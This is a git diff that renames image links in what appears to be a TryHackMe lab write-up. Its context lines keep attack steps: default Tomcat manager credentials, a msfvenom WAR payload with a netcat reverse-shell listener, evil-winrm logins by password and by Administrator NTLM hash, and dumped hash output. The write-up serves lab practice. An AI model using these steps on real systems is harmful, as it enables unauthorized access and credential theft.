@@ -71,7 +71,7 @@ Nmap done: 1 IP address (1 host up) scanned in 176.06 seconds
 
 ### 8080 - Apache Tomcat
 
-<figure><img src="../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 The version 8.5.50 doesn't seem vulnerable.
 
@@ -101,7 +101,7 @@ Apache Tomcat Host Manager (web)	xampp	xampp
 
 With the `tomcat : s3cret`  creds we are in.
 
-<figure><img src="../../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Craft WAR payload with msfvenom
 
@@ -117,15 +117,15 @@ nc -lvnp 9009
 
 Upload the WAR payload and then open the application from the Management page
 
-<figure><img src="../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 We dive into this page and a connection has been establish
 
-<figure><img src="../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -166,7 +166,7 @@ evil-winrm -i wrk.tryhackme.loc -u 'svc.callback' -p 'qvBVAj9avM3ykcbf9s'
 
 This command allow us to access into the WRK machine as `svc.callback` user.
 
-<figure><img src="../../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -180,7 +180,7 @@ With the follow command we can see all information about `svc.callback` user.
 whoami /all
 ```
 
-<figure><img src="../../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 From this information we can understand that the user has:
 
@@ -229,7 +229,7 @@ WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:95f2822ae7e725c8e30b2b31
 [*] Cleaning up... 
 ```
 
-<figure><img src="../../../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -240,7 +240,7 @@ An attacker with the Administrator NTLM could make access to the machine using t
 <pre class="language-bash" data-overflow="wrap"><code class="lang-bash"><strong>evil-winrm -i wrk.tryhackme.loc -u 'Administrator' -H 'e75f25c6788a558e4f3f49714ed95e41'
 </strong></code></pre>
 
-<figure><img src="../../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
